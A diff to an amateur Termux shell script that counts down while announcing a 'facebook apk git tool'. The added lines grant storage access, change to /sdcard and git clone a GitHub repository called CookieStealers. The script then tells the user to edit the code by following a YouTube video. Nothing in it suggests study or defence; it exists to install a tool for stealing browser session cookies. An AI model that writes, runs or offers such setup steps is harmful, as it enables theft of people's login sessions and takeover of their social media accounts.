@@ -21,7 +21,22 @@ echo "you downloaded aide, good🥰🥰🥰"
 sleep 5
 clear
 echo "now i am going to clone facebook apk git tool...5"
+clear
 echo "now i am going to clone facebook apk git tool...4"
+clear
 echo "now i am going to clone facebook apk git tool...3"
+clear
 echo "now i am going to clone facebook apk git tool...2"
+clear
 echo "now i am going to clone facebook apk git tool...1"
+clear
+termux-setup-storage
+cd /sdcard
+git clone https://github.com/Hax4us/CookieStealers
+echo "cookieStealers folder have been created on your internal storage"
+sleep 4
+echo "its time to edit some codes, for that watch video on youtube"
+sleep 2
+echo "ending for now"
+echo "see u soon"
+
